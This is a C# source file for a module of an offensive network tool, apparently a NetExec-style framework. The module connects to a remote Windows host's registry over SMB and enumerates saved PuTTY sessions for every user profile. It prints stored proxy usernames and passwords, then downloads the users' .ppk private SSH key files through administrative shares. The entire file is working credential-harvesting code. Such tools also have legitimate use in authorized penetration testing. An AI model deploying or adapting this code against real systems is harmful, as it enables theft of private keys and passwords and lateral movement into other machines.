using Titanis;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Msrrp;
using Titanis.Msrpc.Mswkst;
using Titanis.Smb2;
using Titanis.Winterop.Registry;
using Titanis.Winterop.Security;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec putty: extracts PuTTY sessions + downloads .ppk keys.
/// </summary>
public sealed class SmbPuttyModule : AtlasModule<Smb2Client>
{
	public override string Name => "putty";
	public override string Description => "Extracts PuTTY sessions from registry and downloads .ppk keys";

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		int sessions = 0;
		try
		{
			RpcClient rpc = ctx.Services.CreateRpcClient();
			using RemoteRegistryClient reg = new RemoteRegistryClient();
			await rpc.ConnectPipe(reg, ctx.Client, new UncPath(ctx.Host, Smb2Client.IpcName, reg.WellKnownPipeName ?? "winreg"), cancellationToken).ConfigureAwait(false);

			var sidToUser = await BuildSidMapAsync(reg, cancellationToken).ConfigureAwait(false);
			await using var hku = await reg.OpenUsers(RegistryAccessRights.KeyRead, cancellationToken).ConfigureAwait(false);
			var hives = new List<string>();
			await foreach (var sub in hku.GetSubkeyNames(cancellationToken).ConfigureAwait(false))
			{
				if (sub.KeyName is ".DEFAULT" || sub.KeyName.EndsWith("_Classes", StringComparison.OrdinalIgnoreCase)) continue;
				hives.Add(sub.KeyName);
			}
			// Include offline hives from ProfileList so sessions of logged-off users are found
			foreach (var sid in sidToUser.Keys)
				if (!hives.Contains(sid, StringComparer.OrdinalIgnoreCase)) hives.Add(sid);

			foreach (var sid in hives)
			{
				cancellationToken.ThrowIfCancellationRequested();
				string who = sidToUser.TryGetValue(sid, out var u) ? u : sid;
				List<string> sessionNames;
				try
				{
					await using var sess = await hku.OpenSubkey($"{sid}\\Software\\SimonTatham\\PuTTY\\Sessions", RegistryAccessRights.KeyRead, RegistryKeyOptions.None, cancellationToken).ConfigureAwait(false);
					sessionNames = new List<string>();
					await foreach (var s in sess.GetSubkeyNames(cancellationToken).ConfigureAwait(false))
						sessionNames.Add(s.KeyName);
				}
				catch { continue; }
				if (sessionNames.Count == 0) continue;
				foreach (var sessName in sessionNames)
				{
					try
					{
						await using var sk = await hku.OpenSubkey($"{sid}\\Software\\SimonTatham\\PuTTY\\Sessions\\{sessName}", RegistryAccessRights.KeyRead, RegistryKeyOptions.None, cancellationToken).ConfigureAwait(false);
						string host = await GetStr(sk, "HostName", cancellationToken).ConfigureAwait(false);
						string ppk = await GetStr(sk, "PublicKeyFile", cancellationToken).ConfigureAwait(false);
						string proxyUser = await GetStr(sk, "ProxyUsername", cancellationToken).ConfigureAwait(false);
						string proxyPass = await GetStr(sk, "ProxyPassword", cancellationToken).ConfigureAwait(false);
						sessions++;
						AtlasConsole.Success($"{ctx.Host}:445", $"(putty) [{who}] {sessName}: host={host} key={ppk}" +
							(string.IsNullOrEmpty(proxyUser) ? "" : $" proxy={proxyUser}:{proxyPass}"));
						if (!string.IsNullOrEmpty(ppk))
							await TryDownloadPpkAsync(ctx, ppk, who, cancellationToken).ConfigureAwait(false);
					}
					catch { }
				}
			}
			if (sessions == 0)
				AtlasConsole.Info($"{ctx.Host}:445", "(putty) No saved putty sessions");
			else
				AtlasConsole.Info($"{ctx.Host}:445", $"(putty) {sessions} session(s)");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(putty) Failed: {ex.Message}");
		}
	}

	private static async Task<Dictionary<string, string>> BuildSidMapAsync(RemoteRegistryClient reg, CancellationToken ct)
	{
		var map = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
		try
		{
			await using var lm = await reg.OpenLocalMachine(RegistryAccessRights.KeyRead, ct).ConfigureAwait(false);
			await using var pl = await lm.OpenSubkey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList", RegistryAccessRights.KeyRead, RegistryKeyOptions.None, ct).ConfigureAwait(false);
			await foreach (var sub in pl.GetSubkeyNames(ct).ConfigureAwait(false))
			{
				try
				{
					await using var k = await pl.OpenSubkey(sub.KeyName, RegistryAccessRights.KeyRead, RegistryKeyOptions.None, ct).ConfigureAwait(false);
					var v = await k.GetValue("ProfileImagePath", ct).ConfigureAwait(false);
					string user = (v.TypedValue?.ToString() ?? string.Empty).Split('\\').Last().TrimEnd('\0');
					if (!string.IsNullOrEmpty(user)) map[sub.KeyName] = user;
				}
				catch { }
			}
		}
		catch { }
		return map;
	}

	private static async Task<string> GetStr(RegistryKey key, string name, CancellationToken ct)
	{
		try
		{
			var v = await key.GetValue(name, ct).ConfigureAwait(false);
			return (v.TypedValue?.ToString() ?? string.Empty).TrimEnd('\0');
		}
		catch { return string.Empty; }
	}

	private async Task TryDownloadPpkAsync(AtlasModuleContext<Smb2Client> ctx, string ppkPath, string who, CancellationToken ct)
	{
		try
		{
			string norm = ppkPath.Replace('/', '\\');
			string share;
			string rel;
			if (norm.Length >= 2 && norm[1] == ':')
			{
				share = norm[..1] + "$";
				rel = norm[2..].TrimStart('\\');
			}
			else if (norm.StartsWith(@"\\"))
			{
				var parts = norm.TrimStart('\\').Split('\\', 3);
				if (parts.Length < 3) return;
				share = parts[1];
				rel = parts[2];
			}
			else return;
			await using var stream = await ctx.Client.OpenFileReadAsync(new UncPath(ctx.Host, share, rel), ct).ConfigureAwait(false);
			using var ms = new MemoryStream();
			await stream.CopyToAsync(ms, ct).ConfigureAwait(false);
			string local = $"{ctx.Host}_{who}_{rel.Split('\\').Last()}";
			await File.WriteAllBytesAsync(local, ms.ToArray(), ct).ConfigureAwait(false);
			AtlasConsole.Success($"{ctx.Host}:445", $"(putty) downloaded {ppkPath} ({ms.Length} bytes -> {local})");
		}
		catch (Exception ex)
		{
			AtlasConsole.Warn($"{ctx.Host}:445", $"(putty) cannot download {ppkPath}: {ex.Message}");
		}
	}
}
